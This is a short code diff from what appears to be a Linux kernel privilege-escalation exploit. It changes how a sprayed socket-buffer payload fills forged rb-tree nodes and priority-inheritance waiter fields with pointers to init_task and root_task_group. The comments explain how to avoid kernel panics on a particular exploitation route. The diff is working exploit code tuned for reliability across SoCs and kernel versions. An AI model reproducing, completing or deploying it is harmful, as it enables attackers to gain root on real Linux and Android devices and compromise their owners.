@@ -383,12 +383,13 @@ int prepare_skb_payload(uintptr_t base) {
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
-  /* Direct-map aliases (data_addr) resolve to the same physical pages and 
-   * are dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK 
-   * the same way for the on-stack waiter. */
-  uint64_t waiter_task = SLIDE_INIT_TASK;
-  uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
-  uint64_t pi_top_task = SLIDE_INIT_TASK;
+  /* The direct-map aliases resolve to the same pages, but mcast panics with
+   * them: the stamp hands these to the PI walk and the alias moves the walk
+   * off the page it was sprayed with. */
+  uint64_t waiter_task = kernel5_route_selected() ? INIT_TASK : SLIDE_INIT_TASK;
+  uint64_t task_group =
+      kernel5_route_selected() ? ROOT_TASK_GROUP : SLIDE_ROOT_TASK_GROUP;
+  uint64_t pi_top_task = kernel5_route_selected() ? INIT_TASK : SLIDE_INIT_TASK;
 
   int compact = active_offsets && active_offsets->compact_waiter;
 
